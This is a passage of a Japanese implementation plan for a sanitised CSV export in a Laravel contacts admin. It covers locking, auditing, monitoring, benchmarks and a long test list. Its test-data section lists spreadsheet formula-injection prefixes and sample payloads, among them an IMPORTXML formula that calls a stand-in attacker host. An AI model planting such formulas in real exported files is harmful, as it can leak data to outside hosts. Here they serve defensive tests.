3. unqualifiedまたはPRAGMA取得失敗なら、ロック・監査開始・Contact SELECT・一時ファイルより前に503を返す
4. `now(config('app.display_timezone', 'Asia/Tokyo'))` でファイル名を生成する
5. canonical条件のHMAC fingerprintを作り、`started` 監査イベントを追記する。失敗時はロックを取らず処理を中止する
6. グローバルロックを非ブロッキングで取得する。競合時は `rejected` を追記し、telemetryを記録して429を返す
7. 取得成功後、query、ファイル名、lock handle、audit handle、開始時刻を `ContactCsvExporter::download()` へ渡す

lock handleの所有権は `download()` 呼び出し時に移る。それ以前の例外はcontrollerの `finally` が監査終端イベントと解放を各1回試行する。移譲後はexporterのfinalizerだけが解放する。

RateLimiterの429はcontrollerへ到達しないため、名前付きLimiterのresponse callbackからPIIなしの `reason=rate_limit` telemetryだけを記録する。監査表には、環境検証とRateLimiterを通過し、controllerが `started` を受理した試行だけを残す。

`CACHE_STORE` は全ワーカー共有とする。グローバルロック、監査表、benchmark samplerはCACHE_STORE、CACHE_PREFIX、cache lock tableへ依存しない。

`getStatusCounts()` は新規追加しない。以下の `filteredContactsQuery()` を `index()`、`show()`、`export()` の3か所で再利用し、選択ソートと同方向の `id` を第2ソートへ追加する。

```php
private function filteredContactsQuery(array $filters): Builder
{
    [$sortColumn, $sortDirection] = self::SORT_OPTIONS[$filters['sort']];

    return Contact::query()
        ->filter($filters)
        ->orderBy($sortColumn, $sortDirection)
        ->orderBy('id', $sortDirection);
}
```

`index()` では既存のページネーション後、正規化済みフィルターから次の `$exportQuery` を生成する。`sort` はデフォルト値を含めて常に渡し、`page` / `per_page` は除外する。Ajax・通常レスポンスの双方へ同じ値を渡す。

```php
$exportQuery = array_filter([
    'status' => $filters['status'],
    'keyword' => $filters['keyword'],
    'body_keyword' => $filters['body_keyword'],
    'date_from' => $filters['date_from_display'],
    'date_to' => $filters['date_to_display'],
    'sort' => $filters['sort'],
], fn (mixed $value): bool => $value !== '' && $value !== []);
```

### 6. エラー表示 — CSV例外、`resources/views/admin/contacts/export-limit-exceeded.blade.php`, `resources/views/admin/contacts/export-unavailable.blade.php`

件数またはバイト上限を超えた場合は、部分CSVや `Content-Disposition` を返さず、CSV専用の `admin.contacts.export-limit-exceeded` ビューを422で直接renderし、「条件を絞り込んで再実行してください」と案内する。画面には設定済みの最大件数と最大ファイルサイズ、管理一覧へ戻る操作を表示する。Laravel全体のHTTP 422に影響する `resources/views/errors/422.blade.php` は作成しない。例外のrender結果、専用ビュー、ヘッダー不在、件数超過ではストリーム未作成、バイト超過では作成済みの行バッファと出力用一時ストリームのclose、両経路でのロック解放、および別の `abort(422)` がCSV画面を使わないことを自動テストする。

対象外driver、WAL以外、busy timeout不一致、PRAGMA取得失敗、送信前deadline超過では、利用不能と管理一覧へ戻る操作だけを専用画面に表示する。HTTP 503、CSV用ヘッダーなしとし、接続名、実PRAGMA値、認証情報は表示しない。

環境不適合は監査表へ書く前に返す。PIIなしのtelemetryには `unsupported_driver`、`journal_mode`、`busy_timeout`、`pragma_error`、`audit_key`、`deadline` のreasonだけを記録する。

### 7. ビュー変更 — `resources/views/admin/contacts/_list.blade.php`

既存の 1〜24行目にある集計行の Flexbox コンテナを活用する。左側の「全 :count 件」とステータスバッジに対し、CSV エクスポートボタンを右側へ配置する。表示件数切り替えは次の行にあるため、同じグループとして並べない。0件時にもヘッダーだけの CSV を取得できるよう、ボタンは集計行に常時表示する。

1行目から24行目の`</div>`（最後の close）の**前**に、以下の CSV エクスポートボタンを追加する。ビューには既に `$exportQuery ?? []` として正規化済みフィルターが渡される：

```blade
<a
    href="{{ route('admin.contacts.export', $exportQuery ?? []) }}"
    class="min-h-11 inline-flex items-center gap-1.5 px-3 py-1.5 text-xs sm:text-sm font-semibold rounded-lg border border-brand-border bg-white dark:bg-stone-900 text-brand-text hover:border-brand-primary hover:text-brand-primary transition-colors shadow-sm"
    aria-label="{{ __('CSVエクスポート') }}"
>
    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 15V3" />
    </svg>
    {{ __('CSVエクスポート') }}
</a>
```

`download` 属性は付けない。200応答はサーバーの `Content-Disposition: attachment` でダウンロードさせ、422/429/503のHTML応答は通常ナビゲーションとしてブラウザに表示させる。Flexbox の `justify-between` により、左側と右側に自動的に分かれ、CSS 変更不要。ボタンは最小タップ領域 `44px` (min-h-11) を保持。`aria-hidden="true"` でスクリーンリーダーから SVG を隠し、`aria-label` でボタン自体に説明を付与。

### 8. 翻訳ファイル変更 — `resources/lang/en.json`

既存の翻訳パターンに従い、`en.json` に日本語キーと英訳のペアを追加する。`ja.json` への追加は不要。

`resources/lang/en.json` に以下の新規キーを追加（複数キーを一括配置する場合は、既存キーの中途に含める）：

```json
{
  // ... 既存キー ...
  "CSVエクスポート": "Export CSV",
  "CSVエクスポート上限を超えました": "CSV export limit exceeded",
  "CSVエクスポートを利用できません": "CSV export is unavailable",
  "CSVエクスポートは現在SQLiteでのみ利用できます。": "CSV export is currently available only with SQLite.",
  "条件を絞り込んで再実行してください。": "Narrow the filters and try again.",
  "名前": "Name",
  "登録日時": "Registered At",
  // ... 以下既存キー ...
}
```

（`ID`, `メールアドレス`, `件名`, `本文`, `ステータス` は既存キーまたはキー文字列そのものを流用する。`メールアドレス` は `en.json` に既に存在するため重複追加しない。`名前` と `登録日時` は CSV ヘッダーの英訳に必要な新規キー。上限超過画面で使う見出し・案内文も同時に追加する。）

**`ja.json` への追加は不要**。既存の翻訳アーキテクチャでは、`ja.json` は **英語キーをキー、日本語訳を値** とするマッピングを使用。日本語原文をキーとする identity mapping（`"CSVエクスポート": "CSVエクスポート"`）は不要。`__()` ヘルパーが日本語キーを見つけられない場合は自動的にキー文字列そのもの（日本語）が使われるため、業務上の問題はない。

### 9. 再実行可能なベンチマークハーネス — `scripts/benchmarks/csv_export/`, `docs/benchmarks/csv_export.md`

§10.3の性能・並行性試験は手作業の一時コードへ依存させず、次のcommit済み資産から実行する。

- `Containerfile`, `compose.yaml`, `nginx.conf`, PHP-FPM pool設定: base imageをdigest固定し、合計2 vCPU・1 GiB、ローカルSSD相当のSQLite volumeを使う。FPMはbackendごとにmaster + 1 worker、別cgroupとする

  Web／proxyは420秒以上、FPM `request_terminate_timeout=570` とする。アプリ生成協調期限120秒、要求協調期限540秒、FPM強制上限570秒、lock600秒の実値をpreflightで確認する
- `Containerfile.fault`, fault provider／adapter群: TTL、refresh間隔、deadlineを短縮するmodeと、close、lock refresh／release、監査追記、telemetry失敗を注入するmodeを持つ。HTTP入力ではmodeを変更できないようにする

  fault imageは非公開network、専用label、許可済みSQLite／log sinkだけで起動する。通常imageへの混入はCIとpreflightで失敗させる
- `benchmark.env.example`: image digest、CPU・memory、backend、PID／cgroup、SQLite、temp、lock、cache、各timeout、監査表、監査鍵version、秘密参照名、telemetry sinkを列挙する。HMAC鍵そのものは含めない
- `generate_fixtures.php`: §10.3で定義した全フィクスチャをseed `20260722` から生成し、件数・一致トークン・ID範囲・想定CSVサイズを検証する。指定された専用SQLiteパス以外を変更せず、既存の開発・本番DBを拒否するguardを設ける
- `writer.php`: 2プロセス、各20操作/秒、交互INSERT/UPDATEの固定負荷を生成し、commit成功・失敗とlatencyをJSON Linesで出力する
- `sample_metrics.php`: worker／cgroup／proxy memory、temp、WAL、lockの `expires_at`、audit event時刻、telemetry到着時刻、FPM termination log、watchdog通知を採取する。lease更新、callback完了、強制終了、論理失効、別owner取得の順序を検証する
- `run.php`: fixture、warm-up、5回測定、writer、sampler、切断、低速配信、lease更新、deadline、FPM kill、PRAGMA不適合、監査／telemetry故障を実行する。SLO、期限順序、FPM終了通知、未完了監査watchdog、証跡欠落、後処理漏れで非0終了する

標準実行コマンドは `php scripts/benchmarks/csv_export/run.php --scenario=all --manifest=<path>` とする。ハーネス、通常／fault固定環境定義、出力schemaはcommitし、生成DB、CSV、cookie、秘密値、raw artifactsは `.gitignore` で除外する。全5回の値、中央値、失敗判定、manifest hash、ハーネスのcommit SHA、通常／fault image digestは `docs/benchmarks/csv_export.md` にcommitする。ハーネスを変更した場合は全シナリオを再実行し、異なるハーネス版の測定値を混在させない。fault imageは出荷artifactではなく、通常imageにfault providerが存在しないことを出荷判定へ含める。

### 10. 運用監視とrunbook — `docs/runbooks/csv_export.md`

運用担当を監視設定と一次対応のowner、開発担当を原因調査と非同期移行のownerとする。利用する監視製品は環境依存でも、次の契約と検証証跡をrunbookへ固定する。

`scripts/monitoring/check_csv_export_audits.php` をcommitし、アプリのHTTP workerとは別の監視user／schedulerから1分ごとに実行する。SQLiteをread-onlyで開き、600秒より古い未完了監査IDだけをPIIなしのJSONへ出力する。未完了検出またはDB読取失敗は非0終了、正常は0とし、監視agentが非0をpageへ変換する。

- 同一ホストの監視agentが毎日00:00〜01:00 JSTに `SELECT COUNT(*) AS contacts_count FROM contacts` をread-onlyで実行する。90,000件以上でwarningを運用担当へ通知し、100,000件へ達する前に再ベンチマークまたは非同期移行issueを期限・担当者付きで作成する。監視失敗または24時間以上の欠測自体もwarningにする
- readinessでdriver、`journal_mode=wal`、`busy_timeout=5000`、監査trigger、監査HMAC鍵／version、DB／temp権限を確認する。不一致は即時pageとし、CSV機能を503のままにする
- `contact_csv_export.finished` から生成・配信・総時間のhistogram、結果別counter、行数・byte数を作る。生成30秒または総時間360秒超過はwarning、5xxとdeadlineは1件でpageとする
- `contact_csv_export.lock_refresh_failed`、`contact_csv_export.audit_failed`、`cleanup_failed phase=lock_release` は1件でpageとする。stream close失敗はwarning ticketとする
- FPMのCSV worker強制終了は、それ自体を外部のFPM log監視から1件でpageとする。570秒以内に終了しない場合も別ruleでpageとする
- watchdogはアプリworkerとは別プロセスで1分ごとに監査表を読み、`started` または `generated` の最新イベントから600秒を過ぎても `rejected`、`stream_completed`、`failed` のない監査IDを1件でpageとする。アプリ停止中も監視を継続する
- ロック回復は物理削除ではなく、最終 `expires_at` 後の別owner取得と正常解放で確認する。FPM kill時にアプリ終端イベントがないことを正常とは扱わず、FPM logとwatchdogの両方で検知する
- 監査表の保持期間、閲覧role、外部archive、offline purge、鍵version、鍵rotationをrunbookへ記載する。trigger不在、監査イベントの欠番・書き込み失敗、過去鍵の保持不足を日次検査する
- stagingではfault imageから件数／欠測、SLO、deadline、FPM termination、未完了監査watchdog、lock refresh／release、監査、各closeの通知を発火する。rule ID、時刻、image digest、論理失効／再取得時刻を証跡へ残す
- 本番リリース前に監視provider、rule ID、通知先role、一次対応SLOをrunbookへ記入する。監視基盤がない、通知試験が未成功、日次件数監視がDBへ到達できない場合は同期エクスポートを出荷しない

runbookには、SLO超過、PRAGMA drift、lease更新／解放失敗、監査欠測、WAL肥大の一次対応と機能停止判断を記載する。アプリ停止時にも欠測を検知できる外部監視を必須とする。

## 6. テスト追加

既存の命名、admin factory、localeパターンを踏襲する。HTTP成功テストでは `streamedContent()` を使えるが、メモリ性能判定には使わない。

配信失敗テストはbase `StreamedResponse::sendContent()` を共通helperから呼び、出力バッファを `finally` で復元する。chunk、lease、deadlineはfake clockで進め、実時間のsleepを使わない。

CSVはBOMを除いて `fgetcsv(..., escape: '')` で検証する。インジェクション対策は生バイトも確認する。wall timeは `Carbon::setTestNow()`、deadlineはfake単調時計で固定する。

1. `test_unauthenticated_user_cannot_export_csv` — 未ログイン → `assertRedirectToRoute('login')`
2. `test_authenticated_non_admin_user_cannot_export_csv` — 非admin → `assertForbidden()`
3. `test_csv_export_rate_limit_is_applied_per_admin_user` — 設定回数を超えた同一ユーザーは429、別ユーザーは影響を受けない
4. `test_second_export_is_rejected_while_first_export_is_streaming` — 1件目のレスポンス取得後・`streamedContent()` 前は専用 `csv_export_locks` 行が有効で、別リクエストは429となり一時ストリームを新規作成しない。確認後は1件目を最後まで配信し、所有者一致DELETEで行を削除する
5. `test_admin_can_export_csv` — 200、`Content-Type`、`Content-Disposition`、正確な `Content-Length`、`Cache-Control: no-store, private`、`X-Content-Type-Options: nosniff`
6. `test_export_csv_filename_uses_display_timezone_and_includes_timestamp` — `2026-07-22 15:00:00 UTC`を固定し、Asia/Tokyoで `contacts_20260723_000000.csv` となる
7. `test_export_csv_starts_with_utf8_bom_and_header_row` — 先頭が `"\xEF\xBB\xBF"`、続くヘッダー行が期待通り
8. `test_export_csv_contains_contact_data_row` — 既知データの各列が正しく出力される
9. `test_export_csv_preserves_rfc4180_special_characters` — カンマ、ダブルクォート、CRLF/LF、バックスラッシュ＋ダブルクォート、日本語、絵文字を含む各列が7列のまま正確に読み戻せる
10. `test_export_csv_respects_status_filter`
11. `test_export_csv_respects_statuses_alias` — `statuses=in_progress` でも対応中のみが出力される
12. `test_export_csv_respects_keyword_filter`
13. `test_export_csv_respects_body_keyword_filter`
14. `test_export_csv_respects_date_range_filter`
15. `test_export_csv_respects_sort_order`
16. `test_export_csv_outputs_each_contact_once_when_sort_values_tie` — 501件を同じ選択ソート値で作成し、CSV の ID が期待する `id` 順で、重複・欠落なく1回ずつ出力される
17. `test_index_show_and_export_share_tie_breaker_order` — 同じ第1ソート値のデータに対し、一覧順、詳細の前後 ID、CSV の ID 順が一致する
18. `test_export_csv_uses_bounded_probe_and_ordered_export_queries_in_one_transaction` — 上限内では同一transaction内で、`ORDER BY` なし・`id` のみ・`LIMIT (設定上限 + 1)` のプローブと、選択ソート＋`id`・`LIMIT 設定上限` の本体SELECTを各1回だけ実行する。`lazy()`、無制限SELECT、事前 `count()` を使用しない
19. `test_export_csv_rejects_more_than_configured_row_limit_without_partial_download` — テスト中だけ上限を2件にし、順序なしプローブの3件目で422、`Content-Disposition`なし、本体の順序付きSELECTと一時ストリーム作成なし、transaction level 0、ロック解放を確認
20. `test_export_csv_rejects_more_than_configured_byte_limit_without_partial_download` — バイト上限を「BOM＋ヘッダー」および「BOM＋ヘッダー＋既知の1行」の正確なサイズ／1バイト小さい値へ差し替えるデータプロバイダーで、上限ちょうどの200、ヘッダーだけまたはデータ行で超過した場合の422、transaction level 0、行バッファと出力用一時ストリームのclose、ロック解放を確認
21. `test_export_csv_is_generated_before_response_streaming` — レスポンスオブジェクト取得後、`streamedContent()` 実行前にtransaction levelが0であり、元レコードを更新しても CSV には更新前の値が含まれる
22. `test_export_lock_is_held_until_stream_finishes_and_then_released` — レスポンス取得時は専用ロック行が有効で、配信完了後は行が削除済み
23. `test_export_csv_ignores_pagination_and_exports_all_matching_rows` — 上限内では `per_page`/`page` を指定しても条件一致行を全件出力
24. `test_export_csv_returns_header_only_when_no_contacts_match` — 0件時はヘッダー行のみ
25. `test_native_csv_stream_operations_are_bound_and_used` — サービスコンテナのbinding、行バッファ再利用、user-abort設定の保存・復元を含むネイティブアダプター全メソッドの正常系を確認
26. `test_export_closes_created_resources_and_releases_lock_when_stream_creation_fails` — 出力用一時ストリーム作成失敗と、その作成後の行バッファ作成失敗をデータプロバイダー化し、後者では作成済み出力ストリームだけを閉じる
27. `test_export_closes_both_streams_and_releases_lock_when_bom_write_fails` — 0・`false`・例外をデータプロバイダー化
28. `test_export_closes_both_streams_and_releases_lock_when_csv_row_encoding_or_write_fails` — テストダブルでヘッダー・データ行それぞれの符号化失敗と0・`false`・例外の書き込み位置をデータプロバイダー化
29. `test_export_closes_both_streams_and_releases_lock_when_position_lookup_fails`
30. `test_export_closes_both_streams_and_releases_lock_when_rewind_fails`
31. `test_export_closes_both_streams_and_releases_lock_when_chunk_read_or_output_fails` — chunk readの`false`／短縮、output／flush例外を発生させ、出力バッファ復元と一度だけのfinalizerを確認
32. `test_export_logs_each_stream_close_failure_and_still_releases_lock_after_successful_stream` — 行バッファ／出力用一時ストリームのcloseが `false` / 例外でも、もう一方のcloseとロック解放を試行し、各phaseの後処理失敗をログへ残し、コールバックから新たな例外を投げないことをデータプロバイダーで確認
33. `test_export_csv_sanitizes_all_dangerous_prefixes` — `=`,`+`,`-`,`@`,`\t`,`\r`,`\n`,`＝`,`＋`,`－`,`＠` と通常値をデータプロバイダーで検証
34. `test_export_csv_sanitizes_each_user_controlled_field` — 名前、メールアドレス、件名、本文のそれぞれに対策が適用される
35. `test_export_csv_quotes_sanitized_fields_with_leading_tab` — 生の CSV バイト列を検査し、危険値が `"\t=..."` のようにタブ接頭辞ごとダブルクォート内へ直列化されることを確認
36. `test_export_csv_header_labels_localized_in_english` — 英語ロケールでヘッダーが英語になる
37. `test_csv_export_limit_error_is_scoped_localized_and_has_no_download_headers` — CSV専用422画面の日本語・英語表示とダウンロード用ヘッダー不在、別の `abort(422)` がCSV専用画面を使わないことを確認
38. `test_index_csv_export_link_uses_normalized_filters` — `statuses` を含むフルビューから、正規化後の `status`、keyword、body_keyword、date_from/date_to、sort を含み、page/per_page を含まない href が生成され、リンクに `download` 属性がない
39. `test_ajax_index_csv_export_link_uses_normalized_filters` — XHR で再描画された `_list` にも同じ href が含まれ、リンクに `download` 属性がない
40. `test_export_csv_probe_and_export_share_sqlite_snapshot` — ファイルベース SQLite + WAL で、プローブ完了後・本体SELECT前に別接続から条件一致行をINSERTしても、同じread transactionのCSVには新規行が混入せず、transaction終了後の次回エクスポートには含まれる
41. `test_export_logs_lock_release_failure_after_successful_stream` — ロック解放の `false` / 例外をデータプロバイダーで発生させ、CSV配信は完了し、コールバックから新たな例外を投げず、許可した固定ロックキー・phase・reason・例外クラスだけをログへ残し、解放を再試行しない
42. `test_export_preserves_primary_exception_when_secondary_cleanup_also_fails` — 生成、上限、chunk、deadline、refreshを主失敗とし、close、監査失敗追記、telemetry、解放の二次失敗でも主例外が保持される
43. `test_csv_export_returns_503_before_audit_lock_and_query_when_environment_is_not_qualified` — unsupported driver、`journal_mode=delete`、busy timeout不一致、PRAGMA例外、監査HMAC鍵／versionの欠落・形式不正をデータ化し、ローカライズ済み汎用画面、CSVヘッダー不在、監査・lock・Contact SELECT・stream未作成を確認
44. `test_sqlite_export_snapshot_survives_fixed_write_load_and_checkpoint_recovers` — テスト専用ファイルSQLiteで `wal_autocheckpoint=10` とし、プローブ後の同期フック中にwriterから固定10回のINSERTと10回のUPDATEを交互にcommitする。readerのスナップショットが不変で、read transaction中の `wal_checkpoint(PASSIVE)` では総フレーム数がcheckpoint済みフレーム数を上回り、終了後の `wal_checkpoint(TRUNCATE)` が `busy=0` でWALを0へ切り詰めることを確認
45. `test_csv_export_configuration_enforces_hard_safety_bounds` — 引き下げ可能な3値のcapと、TTL600、refresh60、生成120、要求540、chunk256 KiB、busy timeout5000が外部値で変わらないことを確認
46. `test_export_completes_partial_positive_writes_without_corrupting_csv` — BOM・ヘッダー・データ行の各位置で `write()` が1〜数バイトだけ返すテストダブルを使い、未書き込み部分だけを再試行して最終CSV、BOM、`Content-Length` が完全であることを確認
47. `test_export_treats_zero_length_write_as_primary_failure` — write-allループ中の0バイト返却で無限ループせず主例外とし、行バッファclose・出力ストリームclose・ロック解放を各1回実行する
48. `test_export_treats_unexpected_chunk_length_as_primary_failure` — EOF前短縮、累積 `Content-Length - 1`／`+1` を主失敗とし、送信済みレスポンスを置換せず後処理を各1回実行する
49. `test_file_sqlite_connection_applies_fixed_wal_and_busy_timeout` — 分離プロセスへ `DB_JOURNAL_MODE=DELETE` と `DB_BUSY_TIMEOUT=0` を与えても専用の一時SQLiteファイルをLaravel接続で開くと `journal_mode=wal`、`busy_timeout=5000` となることを確認し、接続と一時ファイルを `finally` で破棄する
50. `test_export_ends_read_transaction_on_every_generation_exit` — 正常、上限、I/O、生成deadlineの全経路でlock refresh／release前にtransaction level 0となり、checkpointできることを確認
51. `test_sqlite_csv_export_lock_enforces_owner_refresh_and_ttl_atomically` — 取得、owner付きrefresh、期限切れ引継ぎ、旧ownerのrefresh／release拒否、現owner解放を実SQLiteで確認
52. `test_sqlite_csv_export_lock_refresh_and_release_contention_are_not_success` — 別接続のwrite lockでrefresh／releaseを失敗させ、成功扱いせず安全なphaseを記録する
53. `test_export_refreshes_owned_lock_during_slow_stream` — fake clockでchunk間を進め、60秒ごとにowner付きrefreshし、配信完了まで別要求が429となる
54. `test_export_stops_when_lock_refresh_fails` — refreshの0行／`false`／例外で後続chunkを送らず、主失敗、`failed`監査、page、finalizerを各1回実行する
55. `test_export_enforces_generation_and_request_cooperative_deadlines` — fake clockで生成120秒の送信前503と要求540秒の配信停止を確認する。ブロッキング呼び出しを中断できる保証とは扱わず、実際の強制終了はfault harnessのFPM 570秒試験で確認する
56. `test_export_records_append_only_audit_events_without_sensitive_data` — success／lock拒否／limit／I/O失敗でevent順、actor ID、専用HMACと鍵version、canonical化、行数、byte数を確認する。UPDATE／DELETE triggerがruntime接続を拒否し、生条件、PII、鍵が存在しないことも確認する
57. `test_export_fails_closed_when_required_audit_event_cannot_be_recorded` — `started`失敗ではquery／lock／streamなし、`generated`失敗ではbody送信なしで解放する
58. `test_export_emits_safe_telemetry_for_success_rejection_and_failure` — duration、結果、行数、byte数、reasonだけを許可し、PII、raw filter、owner、例外messageを拒否する
59. `test_csv_export_audit_watchdog_detects_only_stale_incomplete_attempts` — 一時SQLiteで完了済み、600秒以内、600秒超過、DB読取失敗を固定し、stale未完了だけのPIIなしJSON、終了code、read-only動作を確認する

テスト25〜32、41、42、46〜48、53〜58はunit testを中心にする。I/O、clock、lock、audit、telemetryのtest doubleから全失敗を再現し、sleepや組み込み関数mockへ依存しない。テスト59はcommit済みwatchdog scriptを分離processで実行する。

成功、上限、deadline、chunk、lease、監査、telemetry、後処理を分岐matrix化する。行カバレッジ100.0%を分岐カバレッジとは呼ばない。

テスト40、43、44、49、50はSQLite concurrency／environment test、51、52はlock testで一時ファイルDBを使う。43は本番validator、51／52は本番lock実装を通す。

各testは接続を切断してからDB、`-wal`、`-shm`を `finally` で削除する。通常のHTTP testはqualified validatorを注入し、`:memory:` をWAL合格と偽装するproduction分岐は作らない。

## 7. テストデータ仕様

### CSV インジェクション対策ケース

以下の値をテストデータの各フィールドに配置し、テスト `test_export_csv_sanitizes_all_dangerous_prefixes` で検証します：

**危険プリフィックスの検証**:
- ASCII 危険文字（先頭から順に検査）：`=`, `+`, `-`, `@`, `\t`, `\r`, `\n`
- 全角対応文字：`＝`, `＋`, `－`, `＠`
- 対策：各プリフィックスで始まる値にはタブ(`\t`)を先頭に付与
- 生バイト列：少なくとも `=`, `+`, `-`, `@` と全角対応文字について、出力セルが `"\t..."` の形でダブルクォートに囲まれていることを検証する。制御文字で始まるケースも同じ引用条件を満たすことを確認する

**テストデータ例**:
```php
Contact::factory()->create([
    'name' => '=SUM(1+2)',  // 危険プリフィックス
    'email' => 'user@example.com',
    'subject' => 'Test',
    'body' => 'Normal text',
]);

Contact::factory()->create([
    'name' => '+1',  // 危険プリフィックス
    'email' => '+2@example.com',  // 危険プリフィックス
    'subject' => 'Test',
    'body' => 'Normal text',
]);

Contact::factory()->create([
    'name' => '＝式テスト',  // 全角危険文字
    'email' => '＋user@example.com',  // 全角危険文字
    'subject' => 'Test',
    'body' => '-command',  // 危険プリフィックス
]);
```

### RFC 4180 ラウンドトリップテストケース

テスト `test_export_csv_preserves_rfc4180_special_characters` で、以下の値を組み合わせたテストデータを検証します：

**必須テストフィールド**:
```php
Contact::factory()->create([
    'name' => '山田, 太郎 "営業部"',
    'email' => 'user+tag@example.com',
    'subject' => "Line 1\nLine 2\rLine 3\r\nLine 4",
    'body' => 'Quote: "Hello" and \\ backslash and emoji 😀 🎉',
]);
```

**検証内容**:
- カンマで囲まれることで7列を保持
- 内側のダブルクォートがエスケープ（`""` に変換）
- 改行（CRLF/LF/CR）が保持
- バックスラッシュが正確に読み戻される
- 日本語・絵文字が文字化けなく出力される

### 同期上限の境界ケース

自動テストでは本番件数を作らず、設定値を小さく差し替えて同じ実装経路を検証する。

- 件数上限を2に設定し、2件は200で全件出力、3件はプローブだけで422となり、CSV本文とダウンロードヘッダー、本体の順序付きSELECT、一時ストリームを作らない
- 上限内の2件では、同一read transaction内で順序なし・`id`のみ・`LIMIT 3` のプローブ1回と、指定ソート＋`id`・`LIMIT 2` の本体SELECT1回を実行する。プローブは `ORDER BY`、`count()`、全件materializeを含まない
- バイト上限を「BOM + ヘッダー」と同じ値にした0件CSVは200、その値より1バイト小さい場合はデータ行がなくても422
- バイト上限を「BOM + ヘッダー + 既知の1行」と同じ値にした場合は200、その値より1バイト小さい場合はデータ行書き込み後に422
- 件数超過の422では未作成ストリームをcloseしようとせず、バイト超過の422では作成済みストリームをcloseする。どちらもグローバルロックを解放し、直後の上限内エクスポートが成功する
- ファイルベース SQLite + WAL の別接続からプローブと本体SELECTの間にINSERTし、両SELECTが同じスナップショットを参照することを固定する

### Excel 互換性検証用テストデータ

`composer dev` での手動検証に使用するテストデータ：
```php
Contact::factory()->create([
    'name' => '＝IMPORTXML("http://attacker.com")',
    'email' => 'user@example.com',
    'subject' => 'CSV インジェクション',
    'body' => 'カンマ, ダブルクォート", 絵文字 🚀',
]);
```

このデータを含む CSV をダウンロードし、Windows/Mac の Microsoft Excel でダブルクリック展開後、数式が実行されず文字列で表示されることを確認してください。

## 8. 対象ファイル一覧

- `config/database.php`
- `config/contact.php`
- `.env.example`
- `README.md`
- `CLAUDE.md`（正式な単一ホストSQLite出荷境界と移行条件）
- `docs/decisions/001-single-host-sqlite-deployment.md`（新規、正式な出荷構成のADR）
- `database/migrations/*_create_csv_export_locks_table.php`（新規、SQLite専用グローバルロック表）
- `database/migrations/*_create_csv_export_audit_events_table.php`（新規、監査イベント表とUPDATE／DELETE拒否trigger）
- `app/Providers/AppServiceProvider.php`
- `app/Contracts/CsvExportLockManager.php`（新規）
- `app/Contracts/AcquiredCsvExportLock.php`（新規）
- `app/Services/SqliteCsvExportLockManager.php`（新規）
- `app/Services/SqliteAcquiredCsvExportLock.php`（新規）
- `app/Contracts/CsvExportEnvironmentValidator.php`（新規）
- `app/Services/SqliteCsvExportEnvironmentValidator.php`（新規）
- `app/Contracts/CsvExportClock.php`（新規）
- `app/Services/NativeCsvExportClock.php`（新規）
- `app/Contracts/CsvExportAuditRecorder.php`（新規）
- `app/Contracts/CsvExportAudit.php`（新規、単一監査IDへの追記専用handle）
- `app/Services/SqliteCsvExportAuditRecorder.php`（新規）
- `app/Contracts/CsvExportTelemetry.php`（新規）
- `app/Services/LogCsvExportTelemetry.php`（新規）
- `app/Contracts/CsvStreamOperations.php`（新規）
- `app/Services/NativeCsvStreamOperations.php`（新規）
- `app/Services/ContactCsvExporter.php`（新規）
- `app/Exceptions/CsvExportLimitExceededException.php`（新規）
- `app/Exceptions/CsvExportDeadlineExceededException.php`（新規）
- `routes/web.php`
- `app/Http/Controllers/Admin/ContactController.php`
- `resources/views/admin/contacts/_list.blade.php`
- `resources/views/admin/contacts/export-limit-exceeded.blade.php`（新規、CSV専用422案内）
- `resources/views/admin/contacts/export-unavailable.blade.php`（新規、環境不適合・送信前期限超過の503案内）
- `resources/lang/en.json`
- `tests/Feature/Admin/ContactControllerTest.php`
- `tests/Feature/CsvExportSqliteConcurrencyTest.php`（新規、ファイルSQLiteの固定PRAGMA・スナップショット・transaction解消・checkpoint圧力検証）
- `tests/Feature/CsvExportLockTest.php`（新規、専用SQLiteロックのowner・TTL・実競合検証）
- `tests/Feature/CsvExportEnvironmentTest.php`（新規、driver・実PRAGMAのfail-closed検証）
- `tests/Unit/Config/ContactConfigTest.php`（新規、ハード安全上限の分離プロセステスト）
- `tests/Unit/Services/ContactCsvExporterTest.php`（新規）
- `tests/Unit/Services/CsvExportAuditRecorderTest.php`（新規、trigger、canonical HMAC、鍵version、PII不在）
- `tests/Unit/Services/CsvExportTelemetryTest.php`（新規、許可field固定）
- `tests/Feature/CsvExportAuditWatchdogTest.php`（新規、read-only watchdogの分離processテスト）
- `scripts/monitoring/check_csv_export_audits.php`（新規、未完了監査の外部watchdog）
- `scripts/benchmarks/csv_export/Containerfile`（新規、digest固定の暫定基準環境）
- `scripts/benchmarks/csv_export/Containerfile.fault`（新規、非本番専用fault image）
- `scripts/benchmarks/csv_export/compose.yaml`（新規、CPU・メモリ・worker・volume固定）
- `scripts/benchmarks/csv_export/nginx.conf`（新規、配信buffer・timeout固定）
- `scripts/benchmarks/csv_export/php-fpm.conf`（新規、各backendを1 workerへ固定）
- `scripts/benchmarks/csv_export/fault/`（新規、通常imageに含めないprovider／fault adapter）
- `scripts/benchmarks/csv_export/run.php`（新規、全シナリオの単一エントリポイント）
- `scripts/benchmarks/csv_export/generate_fixtures.php`（新規、固定seedのデータ生成）
- `scripts/benchmarks/csv_export/writer.php`（新規、固定負荷writer）
- `scripts/benchmarks/csv_export/sample_metrics.php`（新規、RSS・WAL・temp・ロック状態の採取）
- `scripts/benchmarks/csv_export/benchmark.env.example`（新規、基準環境manifestの雛形）
- `docs/runbooks/csv_export.md`（新規、SLO・PRAGMA・lease・監査・cleanupの監視と対応手順）
- `docs/benchmarks/csv_export.md`（新規、基準環境と測定結果）
- `.gitignore`（ベンチマーク生成物を除外）
- `screenshots/admin_dashboard.jpg`
- `screenshots/demo_admin_dashboard.gif`
- `docs/csv_export_plan.md`（更新）

## 9. 実装開始前の重要確認事項

### 並び順統合の実施タイミング

`index()`、`show()`、`export()` への `filteredContactsQuery()` 統合は、**TDD ステップ12の機能実装として必ず完了する**。`test_index_show_and_export_share_tie_breaker_order` をGreenにするために必要な要件であり、リファクタ段階や次PRへ延期しない。

ステップ20では、既にGreenになった並び順、上限、deadline、lease、監査、telemetry、後処理を変えず、重複排除・命名・可読性だけを改善する。

### 実装時の確認項目

1. **`$exportQuery` に含めるべき項目**:
   - 含める：`status`, `keyword`, `body_keyword`, `date_from_display`, `date_to_display`, `sort`
   - 除外：`page`, `per_page`（ページネーションは無視）
